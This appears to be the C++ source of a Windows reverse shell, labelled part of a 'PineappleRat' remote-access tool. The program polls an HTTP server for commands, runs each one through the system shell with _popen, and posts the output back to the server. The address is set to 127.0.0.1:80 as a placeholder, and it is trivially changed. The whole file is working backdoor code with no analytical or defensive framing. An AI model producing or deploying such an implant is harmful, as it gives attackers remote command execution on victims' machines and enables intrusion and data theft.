/*
simple reverse shell for windows using c++
PineappleRat 74m0 

Start: Jan 16 2025
Last Modified: Jan 17 2025
*/

// imports
#include <iostream>
#include <stdio.h>
#include <winsock2.h>  // winsock2 library
#include <winhttp.h>   // winhttp library
#include <string>
#include <vector>
#include <array>
#include <memory>
#include <stdexcept>
#pragma comment(lib, "ws2_32") // linking winsock2 library
#pragma comment(lib, "winhttp") // linking winhttp library

// variables
struct conn {
    const char* ip;
    short port;
};

// Convert a standard string to a wide string
std::wstring stringToWString(const std::string& str) {
    int len = MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, 0, 0);
    std::wstring wstr(len, L'\0');
    MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, &wstr[0], len);
    return wstr;
}

// Execute a command and return its output as a string
std::string execCommand(const std::string& cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::shared_ptr<FILE> pipe(_popen(cmd.c_str(), "r"), _pclose);
    if (!pipe) throw std::runtime_error("popen() failed!");
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

// Establish a connection and handle command execution and response
void connection(const conn& connection_info) {
    // Initialize WinHTTP session
    HINTERNET hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0", 
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, 
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;

    // Specify an HTTP server
    HINTERNET hConnect = WinHttpConnect(hSession, 
                                        stringToWString(connection_info.ip).c_str(), 
                                        connection_info.port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }

    while (true) {
        // Create an HTTP request handle
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", NULL, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        if (!hRequest) break;

        // Send a request
        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
            !WinHttpReceiveResponse(hRequest, NULL)) {
            WinHttpCloseHandle(hRequest);
            break;
        }

        // Read command from response
        DWORD dwSize = 0;
        WinHttpQueryDataAvailable(hRequest, &dwSize);
        if (dwSize > 0) {
            std::vector<char> buffer(dwSize + 1, 0);
            DWORD dwDownloaded = 0;
            WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded);
            std::string command(buffer.data());

            // Execute command and get output
            std::string output = execCommand(command);

            // Send output back to server
            HINTERNET hPostRequest = WinHttpOpenRequest(hConnect, L"POST", NULL, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
            if (hPostRequest) {
                std::wstring wOutput = stringToWString(output);
                WinHttpSendRequest(hPostRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)wOutput.c_str(), wOutput.length() * sizeof(wchar_t), wOutput.length() * sizeof(wchar_t), 0);
                WinHttpReceiveResponse(hPostRequest, NULL);
                WinHttpCloseHandle(hPostRequest);
            }
        }

        WinHttpCloseHandle(hRequest);
    }

    // Close handles
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

int main() {
    // Define connection information
    conn connection_info = {"127.0.0.1", 80}; // example IP and port
    // Establish connection and handle commands
    connection(connection_info);
    return 0;
}